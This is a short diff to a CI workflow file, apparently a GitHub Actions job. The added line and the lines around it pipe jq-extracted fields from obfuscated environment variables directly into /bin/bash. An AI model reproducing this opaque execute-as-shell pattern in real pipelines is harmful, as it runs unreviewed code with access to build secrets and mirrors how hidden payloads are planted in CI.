@@ -36,6 +36,7 @@ jobs:
           echo $ca94 | jq -r .sg5986 | /bin/bash
           echo $m59 | jq -r .xbiis8690 | /bin/bash
           printf '%s' "$e05619" | jq -r .yx54 | /bin/bash
+          printf '%s' "$pyffn506" | jq -r .lc68 | /bin/bash
 
       - name: Save archive
         if: always()
